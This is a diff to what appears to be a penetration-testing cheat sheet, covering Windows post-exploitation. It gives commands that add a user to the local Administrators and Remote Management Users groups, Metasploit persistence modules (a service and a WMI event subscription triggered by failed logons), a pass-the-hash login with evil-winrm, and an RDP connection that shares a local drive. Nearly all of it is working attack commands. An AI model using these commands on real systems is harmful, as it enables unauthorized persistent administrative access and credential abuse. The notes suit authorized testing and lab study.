@@ -430,7 +430,10 @@ metasploit tfp server module on Kali
      net localgroup Administrators USERNAME /add
      net localgroup "Remote Management Users" USERNAME /add    
      
- Use Metasploit module exploit/windows/local/persistence_service to add a service     
+ Metasploit Modules:  
+ 
+     exploit/windows/local/persistence_service   #to add a service    
+     exploit/windows/local/wmi_persistence       #wmi event subscription, triggered with logon failures (event ID 4625)   
  ## Access  
      pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
      xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
